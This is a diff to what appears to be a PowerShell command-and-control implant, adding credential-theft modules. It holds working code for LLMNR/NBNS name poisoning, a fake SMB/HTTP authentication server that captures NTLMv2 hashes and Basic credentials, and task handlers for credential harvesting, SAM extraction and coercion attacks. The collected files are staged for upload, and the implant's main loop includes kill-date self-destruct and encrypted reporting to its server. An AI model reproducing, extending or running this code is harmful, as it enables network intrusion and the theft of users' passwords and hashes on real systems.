+    $pkt.AddRange([BitConverter]::GetBytes([uint32]65536))   # MaxTransact
+    $pkt.AddRange([BitConverter]::GetBytes([uint32]65536))   # MaxRead
+    $pkt.AddRange([BitConverter]::GetBytes([uint32]65536))   # MaxWrite
+    $ft = [DateTime]::UtcNow.ToFileTimeUtc()
+    $pkt.AddRange([BitConverter]::GetBytes([uint64]$ft))     # SystemTime
+    $pkt.AddRange([BitConverter]::GetBytes([uint64]0))       # ServerStartTime
+    $pkt.AddRange([BitConverter]::GetBytes($secOffset))
+    $pkt.AddRange([BitConverter]::GetBytes([uint16]$secBuf.Length))
+    $pkt.AddRange([BitConverter]::GetBytes([uint32]0))       # NegContextOffset
+    $pkt.AddRange($secBuf)
+    return $pkt.ToArray()
+}
+
+function _Creds-BuildTargetInfo {
+    $info = [System.Collections.Generic.List[byte]]::new(128)
+    $domain = [Text.Encoding]::Unicode.GetBytes("WORKGROUP")
+    $computer = [Text.Encoding]::Unicode.GetBytes("SERVER")
+    # MsvAvNbDomainName (2)
+    $info.AddRange([BitConverter]::GetBytes([uint16]2)); $info.AddRange([BitConverter]::GetBytes([uint16]$domain.Length)); $info.AddRange($domain)
+    # MsvAvNbComputerName (1)
+    $info.AddRange([BitConverter]::GetBytes([uint16]1)); $info.AddRange([BitConverter]::GetBytes([uint16]$computer.Length)); $info.AddRange($computer)
+    # MsvAvDnsDomainName (4)
+    $info.AddRange([BitConverter]::GetBytes([uint16]4)); $info.AddRange([BitConverter]::GetBytes([uint16]$domain.Length)); $info.AddRange($domain)
+    # MsvAvDnsComputerName (3)
+    $info.AddRange([BitConverter]::GetBytes([uint16]3)); $info.AddRange([BitConverter]::GetBytes([uint16]$computer.Length)); $info.AddRange($computer)
+    # MsvAvTimestamp (7)
+    $info.AddRange([BitConverter]::GetBytes([uint16]7)); $info.AddRange([BitConverter]::GetBytes([uint16]8))
+    $info.AddRange([BitConverter]::GetBytes([uint64][DateTime]::UtcNow.ToFileTimeUtc()))
+    # MsvAvEOL (0)
+    $info.AddRange([BitConverter]::GetBytes([uint16]0)); $info.AddRange([BitConverter]::GetBytes([uint16]0))
+    return $info.ToArray()
+}
+
+function _Creds-BuildNtlmChallenge {
+    param([byte[]]$Challenge)
+    $targetInfo = _Creds-BuildTargetInfo
+    $targetName = [Text.Encoding]::Unicode.GetBytes("WORKGROUP")
+    $buf = [System.Collections.Generic.List[byte]]::new(256)
+    $buf.AddRange([Text.Encoding]::ASCII.GetBytes("NTLMSSP")); $buf.Add(0)
+    $buf.AddRange([BitConverter]::GetBytes([uint32]2))  # Type 2
+    $tnOffset = [uint32]48
+    $tiOffset = $tnOffset + [uint32]$targetName.Length
+    $buf.AddRange([BitConverter]::GetBytes([uint16]$targetName.Length))
+    $buf.AddRange([BitConverter]::GetBytes([uint16]$targetName.Length))
+    $buf.AddRange([BitConverter]::GetBytes($tnOffset))
+    # Flags
+    [uint32]$flags = 0x00000001 -bor 0x00000002 -bor 0x00000004 -bor 0x00000010 -bor 0x00000020 -bor 0x00000200 -bor 0x00008000 -bor 0x00080000 -bor 0x00800000 -bor 0x20000000 -bor 0x80000000
+    $buf.AddRange([BitConverter]::GetBytes($flags))
+    $buf.AddRange($Challenge)
+    $buf.AddRange([byte[]]::new(8))  # Reserved
+    $buf.AddRange([BitConverter]::GetBytes([uint16]$targetInfo.Length))
+    $buf.AddRange([BitConverter]::GetBytes([uint16]$targetInfo.Length))
+    $buf.AddRange([BitConverter]::GetBytes($tiOffset))
+    $buf.AddRange($targetName)
+    $buf.AddRange($targetInfo)
+    return $buf.ToArray()
+}
+
+function _Creds-Asn1Len {
+    param([System.Collections.Generic.List[byte]]$Buf, [int]$Len)
+    if ($Len -lt 128) { $Buf.Add([byte]$Len) }
+    elseif ($Len -lt 256) { $Buf.Add(0x81); $Buf.Add([byte]$Len) }
+    else { $Buf.Add(0x82); $Buf.Add([byte](($Len -shr 8) -band 0xFF)); $Buf.Add([byte]($Len -band 0xFF)) }
+}
+
+function _Creds-BuildSpnegoChallenge {
+    param([byte[]]$NtlmBlob)
+    $negState = [byte[]]@(0xa0,0x03,0x0a,0x01,0x01)
+    $ntlmOid = [byte[]]@(0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a)
+    $suppMech = [System.Collections.Generic.List[byte]]::new()
+    $suppMech.Add(0xa1); $suppMech.Add([byte]$ntlmOid.Length); $suppMech.AddRange($ntlmOid)
+    $rtInner = [System.Collections.Generic.List[byte]]::new()
+    $rtInner.Add(0x04); _Creds-Asn1Len $rtInner $NtlmBlob.Length; $rtInner.AddRange($NtlmBlob)
+    $rt = [System.Collections.Generic.List[byte]]::new()
+    $rt.Add(0xa2); _Creds-Asn1Len $rt $rtInner.Count; $rt.AddRange($rtInner)
+    $seqLen = $negState.Length + $suppMech.Count + $rt.Count
+    $seq = [System.Collections.Generic.List[byte]]::new()
+    $seq.Add(0x30); _Creds-Asn1Len $seq $seqLen; $seq.AddRange($negState); $seq.AddRange($suppMech); $seq.AddRange($rt)
+    $result = [System.Collections.Generic.List[byte]]::new()
+    $result.Add(0xa1); _Creds-Asn1Len $result $seq.Count; $result.AddRange($seq)
+    return $result.ToArray()
+}
+
+function _Creds-BuildSessionSetupChallenge {
+    param([byte[]]$Challenge, [uint64]$MsgId)
+    $ntlm = _Creds-BuildNtlmChallenge -Challenge $Challenge
+    $spnego = _Creds-BuildSpnegoChallenge -NtlmBlob $ntlm
+    $pkt = [System.Collections.Generic.List[byte]]::new(256)
+    $pkt.AddRange((_Creds-Smb2Header -Command 1 -Status 0xC0000016 -MsgId $MsgId -SessionId 1 -Flags 1))
+    $secOffset = [uint16]72
+    $pkt.AddRange([BitConverter]::GetBytes([uint16]9))   # StructureSize
+    $pkt.AddRange([BitConverter]::GetBytes([uint16]0))    # SessionFlags
+    $pkt.AddRange([BitConverter]::GetBytes($secOffset))
+    $pkt.AddRange([BitConverter]::GetBytes([uint16]$spnego.Length))
+    $pkt.AddRange($spnego)
+    return $pkt.ToArray()
+}
+
+function _Creds-BuildSessionSetupFailure {
+    param([uint64]$MsgId)
+    $pkt = [System.Collections.Generic.List[byte]]::new(80)
+    $pkt.AddRange((_Creds-Smb2Header -Command 1 -Status 0xC000006D -MsgId $MsgId -SessionId 1 -Flags 1))
+    $pkt.AddRange([BitConverter]::GetBytes([uint16]9))
+    $pkt.AddRange([BitConverter]::GetBytes([uint16]0))
+    $pkt.AddRange([BitConverter]::GetBytes([uint16]0))
+    $pkt.AddRange([BitConverter]::GetBytes([uint16]0))
+    $pkt.Add(0)
+    return $pkt.ToArray()
+}
+
+function _Creds-ExtractNtlmv2 {
+    param([byte[]]$Msg, [byte[]]$Challenge)
+    $sig = [Text.Encoding]::ASCII.GetBytes("NTLMSSP")
+    $offset = -1
+    for ($i = 0; $i -le $Msg.Length - 8; $i++) {
+        $match = $true
+        for ($j = 0; $j -lt 7; $j++) { if ($Msg[$i+$j] -ne $sig[$j]) { $match = $false; break } }
+        if ($match -and $Msg[$i+7] -eq 0) { $offset = $i; break }
+    }
+    if ($offset -lt 0) { return $null }
+    $ntlm = $Msg[$offset..($Msg.Length-1)]
+    if ($ntlm.Length -lt 88) { return $null }
+    $msgType = [BitConverter]::ToUInt32($ntlm, 8)
+    if ($msgType -ne 3) { return $null }
+    $ntLen  = [BitConverter]::ToUInt16($ntlm, 20)
+    $ntOff  = [BitConverter]::ToUInt32($ntlm, 24)
+    $domLen = [BitConverter]::ToUInt16($ntlm, 28)
+    $domOff = [BitConverter]::ToUInt32($ntlm, 32)
+    $usrLen = [BitConverter]::ToUInt16($ntlm, 36)
+    $usrOff = [BitConverter]::ToUInt32($ntlm, 40)
+    if ($ntOff + $ntLen -gt $ntlm.Length) { return $null }
+    if ($usrOff + $usrLen -gt $ntlm.Length) { return $null }
+    if ($domOff + $domLen -gt $ntlm.Length) { return $null }
+    if ($ntLen -lt 24) { return $null }
+    $ntResponse = $ntlm[$ntOff..($ntOff + $ntLen - 1)]
+    $ntProof = $ntResponse[0..15]
+    $ntBlob  = $ntResponse[16..($ntResponse.Length - 1)]
+    $username = [Text.Encoding]::Unicode.GetString($ntlm[$usrOff..($usrOff + $usrLen - 1)])
+    $domain   = [Text.Encoding]::Unicode.GetString($ntlm[$domOff..($domOff + $domLen - 1)])
+    $chalHex  = -join ($Challenge | ForEach-Object { '{0:x2}' -f $_ })
+    $proofHex = -join ($ntProof  | ForEach-Object { '{0:x2}' -f $_ })
+    $blobHex  = -join ($ntBlob   | ForEach-Object { '{0:x2}' -f $_ })
+    return "${username}::${domain}:${chalHex}:${proofHex}:${blobHex}"
+}
+
+function _Creds-HandleHttpClient {
+    param([System.Net.Sockets.TcpClient]$Client)
+    try {
+        $stream = $Client.GetStream()
+        $buf = [byte[]]::new(4096)
+        $n = $stream.Read($buf, 0, $buf.Length)
+        if ($n -le 0) { return $null }
+        $request = [Text.Encoding]::ASCII.GetString($buf, 0, $n)
+        # Check for Basic auth
+        if ($request -match '(?i)authorization:\s*basic\s+(\S+)') {
+            $decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Matches[1]))
+            $peer = $Client.Client.RemoteEndPoint.Address.ToString()
+            return "[HTTP-Basic] $decoded (from $peer)"
+        }
+        # Send 401 with NTLM challenge
+        $resp = "HTTP/1.1 401 Unauthorized`r`nWWW-Authenticate: NTLM`r`nWWW-Authenticate: Basic realm=""Secure""`r`nContent-Length: 0`r`nConnection: keep-alive`r`n`r`n"
+        $respBytes = [Text.Encoding]::ASCII.GetBytes($resp)
+        $stream.Write($respBytes, 0, $respBytes.Length)
+        # Read NTLM response
+        $n2 = $stream.Read($buf, 0, $buf.Length)
+        if ($n2 -le 0) { return $null }
+        $request2 = [Text.Encoding]::ASCII.GetString($buf, 0, $n2)
+        if ($request2 -match '(?i)authorization:\s*basic\s+(\S+)') {
+            $decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Matches[1]))
+            $peer = $Client.Client.RemoteEndPoint.Address.ToString()
+            return "[HTTP-Basic] $decoded (from $peer)"
+        }
+    } catch {}
+    return $null
+}
+
+function _Creds-EnsurePoisoners {
+    param($Active, $Failed)
+    if ($script:_CredsPoisonStop) { return }
+    $script:_CredsPoisonStop = [System.Threading.ManualResetEvent]::new($false)
+    $script:_LlmnrResponses = 0
+    $script:_NbnsResponses  = 0
+    $script:_LlmnrSock = $null
+    $script:_NbnsSock  = $null
+    $script:_PoisonLocalIp = $null
+    try {
+        $script:_PoisonLocalIp = ([System.Net.Dns]::GetHostAddresses([System.Net.Dns]::GetHostName()) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1).GetAddressBytes()
+    } catch {}
+    if (-not $script:_PoisonLocalIp) { $script:_PoisonLocalIp = [byte[]]@(127,0,0,1) }
+
+    try {
+        $script:_LlmnrSock = [System.Net.Sockets.UdpClient]::new(5355)
+        $script:_LlmnrSock.JoinMulticastGroup([System.Net.IPAddress]::Parse("224.0.0.252"))
+        $script:_LlmnrSock.Client.ReceiveTimeout = 1
+        [void]$Active.Add("LLMNR:5355")
+    } catch { [void]$Failed.Add("LLMNR:5355 (in use)") }
+
+    try {
+        $script:_NbnsSock = [System.Net.Sockets.UdpClient]::new(137)
+        $script:_NbnsSock.Client.ReceiveTimeout = 1
+        [void]$Active.Add("NBNS:137")
+    } catch { [void]$Failed.Add("NBNS:137 (in use)") }
+}
+
+function _Creds-PollPoisoners {
+    if (-not $script:_CredsPoisonStop -or $script:_CredsPoisonStop.WaitOne(0)) { return }
+    $localIp = $script:_PoisonLocalIp
+
+    # LLMNR
+    if ($script:_LlmnrSock) {
+        $maxPoll = 3
+        while ($maxPoll -gt 0) {
+            $maxPoll--
+            try {
+                $ep = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any, 0)
+                $data = $script:_LlmnrSock.Receive([ref]$ep)
+                if ($data.Length -ge 12) {
+                    $txId = $data[0..1]
+                    $i = 12
+                    while ($i -lt $data.Length -and $data[$i] -ne 0) { $i += [int]$data[$i] + 1 }
+                    $resp = [System.Collections.Generic.List[byte]]::new()
+                    $resp.AddRange($txId)
+                    $resp.AddRange([byte[]]@(0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00))
+                    $resp.AddRange($data[12..$i])
+                    $resp.AddRange([byte[]]@(0x00,0x01,0x00,0x01))
+                    $resp.AddRange($data[12..($i-1)])
+                    if ($i -lt $data.Length -and $data[$i] -eq 0) { $resp.Add(0) }
+                    $resp.AddRange([byte[]]@(0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x1E,0x00,0x04))
+                    $resp.AddRange($localIp)
+                    $respBytes = $resp.ToArray()
+                    $script:_LlmnrSock.Send($respBytes, $respBytes.Length, $ep) | Out-Null
+                    $script:_LlmnrResponses++
+                }
+            } catch [System.Net.Sockets.SocketException] { break }
+            catch { break }
+        }
+    }
+
+    # NBNS
+    if ($script:_NbnsSock) {
+        $maxPoll = 3
+        while ($maxPoll -gt 0) {
+            $maxPoll--
+            try {
+                $ep = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any, 0)
+                $data = $script:_NbnsSock.Receive([ref]$ep)
+                if ($data.Length -ge 12) {
+                    $txId = $data[0..1]
+                    $nameEnd = 12
+                    while ($nameEnd -lt $data.Length -and $data[$nameEnd] -ne 0) { $nameEnd += [int]$data[$nameEnd] + 1 }
+                    $resp = [System.Collections.Generic.List[byte]]::new()
+                    $resp.AddRange($txId)
+                    $resp.AddRange([byte[]]@(0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00))
+                    $resp.AddRange($data[12..$nameEnd])
+                    $resp.AddRange([byte[]]@(0x00,0x20,0x00,0x01,0x00,0x00,0x00,0x1E,0x00,0x06,0x00,0x00))
+                    $resp.AddRange($localIp)
+                    $respBytes = $resp.ToArray()
+                    $script:_NbnsSock.Send($respBytes, $respBytes.Length, $ep) | Out-Null
+                    $script:_NbnsResponses++
+                }
+            } catch [System.Net.Sockets.SocketException] { break }
+            catch { break }
+        }
+    }
+}
+
 # === CLEANUP ON EXIT ===
 $cleanupBlock = {
+    try { Invoke-CredsListenStop -Spec "all" 2>$null } catch {}
+    if ($script:_CredsPoisonStop) { $script:_CredsPoisonStop.Set() }
+    if ($script:_LlmnrSock) { try { $script:_LlmnrSock.Close() } catch {} }
+    if ($script:_NbnsSock)  { try { $script:_NbnsSock.Close()  } catch {} }
     Clear-Transport
     Remove-Variable -Name RSA, PUBLIC_KEY_PEM, SESSION_KEY -Scope Script -Force 2>$null
     [GC]::Collect()
@@ -849,6 +1774,8 @@ Write-Log "[AGENT]: Entering main loop..."
 
 while ($true) {
     if (Test-KillDateExpired) { Invoke-SelfDestruct }
+
+    if ($script:_CredsListeners.Count -gt 0) { _Creds-PollListeners }
 
     # Default sleep (used by early-exit continue paths; recalculated at end after command runs)
     if ($JITTER -gt 0) {
@@ -971,6 +1898,7 @@ while ($true) {
     $_output       = ""
     $_newCwd       = ""
     $_stagingPath  = ""
+    $_stagingFiles = @()
     $_artifacts    = @()
 
     # === CHECK EXIT (stop execution only - files untouched) ===
@@ -1393,6 +2321,77 @@ while ($true) {
             Write-Log "[EXEC]: Output ($($_output.Length) bytes), CWD=$_newCwd"
         }
 
+        "creds_harvest" {
+            Write-Log "[CREDS]: Harvest credentials (decrypt: $($_taskArgs.decrypt))"
+            try {
+                $decryptFlag = $false
+                if ($_taskArgs.decrypt -eq $true -or $_taskArgs.decrypt -eq "true") { $decryptFlag = $true }
+                $result = Invoke-CredsHarvest -Decrypt $decryptFlag
+                $_output = $result.output
+                if ($result.staged -and $result.staged.Count -gt 0) {
+                    $_stagingFiles = @($result.staged | ForEach-Object {
+                        [ordered]@{ cloud_path = $_.cloud_path; filename = $_.filename; source_path = $_.source_path }
+                    })
+                }
+            } catch {
+                $_output = "ERROR: creds harvest failed: $($_.Exception.Message)"; $_status = "error"
+            }
+        }
+
+        "creds_sam" {
+            Write-Log "[CREDS]: SAM extraction"
+            try {
+                $result = Invoke-CredsSam
+                $_output = $result.output
+                if ($result.staged -and $result.staged.Count -gt 0) {
+                    $_stagingFiles = @($result.staged | ForEach-Object {
+                        [ordered]@{ cloud_path = $_.cloud_path; filename = $_.filename; source_path = $_.source_path }
+                    })
+                }
+            } catch {
+                $_output = "ERROR: creds sam failed: $($_.Exception.Message)"; $_status = "error"
+            }
+        }
+
+        "creds_coerce" {
+            Write-Log "[CREDS]: Coercion attack"
+            try {
+                $_output = Invoke-CredsCoerce
+            } catch {
+                $_output = "ERROR: creds coerce failed: $($_.Exception.Message)"; $_status = "error"
+            }
+        }
+
+        "creds_listen_start" {
+            $port = if ($_taskArgs.port) { [int]$_taskArgs.port } else { 445 }
+            $proto = if ($_taskArgs.proto) { $_taskArgs.proto } else { "smb" }
+            Write-Log "[CREDS]: Listen start ${proto}:${port}"
+            try {
+                $_output = Invoke-CredsListenStart -Port $port -Proto $proto
+            } catch {
+                $_output = "ERROR: creds listen start failed: $($_.Exception.Message)"; $_status = "error"
+            }
+        }
+
+        "creds_listen_stop" {
+            $spec = if ($_taskArgs.spec) { $_taskArgs.spec } else { "all" }
+            Write-Log "[CREDS]: Listen stop $spec"
+            try {
+                $_output = Invoke-CredsListenStop -Spec $spec
+            } catch {
+                $_output = "ERROR: creds listen stop failed: $($_.Exception.Message)"; $_status = "error"
+            }
+        }
+
+        "creds_listen_dump" {
+            Write-Log "[CREDS]: Listen dump"
+            try {
+                $_output = Invoke-CredsListenDump
+            } catch {
+                $_output = "ERROR: creds listen dump failed: $($_.Exception.Message)"; $_status = "error"
+            }
+        }
+
         default {
             $_output = "ERROR: unknown task type '$_taskType'"; $_status = "error"
             Write-Log "[INPUT]: [X] $_output"
@@ -1408,6 +2407,7 @@ while ($true) {
         output        = if ($_output) { $_output } else { "" }
         cwd           = if ($_newCwd) { $_newCwd } else { "" }
         staging_path  = if ($_stagingPath) { $_stagingPath } else { "" }
+        staging_files = @($_stagingFiles)
         artifacts     = @($_artifacts)
         session_token = if ($_taskToken) { $_taskToken } else { "" }
     }
@@ -1415,7 +2415,7 @@ while ($true) {
     # Fix PS5 HTML-escaping of <, >, &
     $responseJson = $responseJson -replace '\\u003e','>' -replace '\\u003c','<' -replace '\\u0026','&'
 
-    Remove-Variable -Name _cmdId, _taskType, _taskArgs, _task, _taskToken, _status, _output, _newCwd, _stagingPath, _artifacts -Force 2>$null
+    Remove-Variable -Name _cmdId, _taskType, _taskArgs, _task, _taskToken, _status, _output, _newCwd, _stagingPath, _stagingFiles, _artifacts -Force 2>$null
 
     # === OUTPUT ENCRYPTION — RSA-OAEP-SHA256 + AES-256-GCM (agent→server) ===
     Write-Log ""
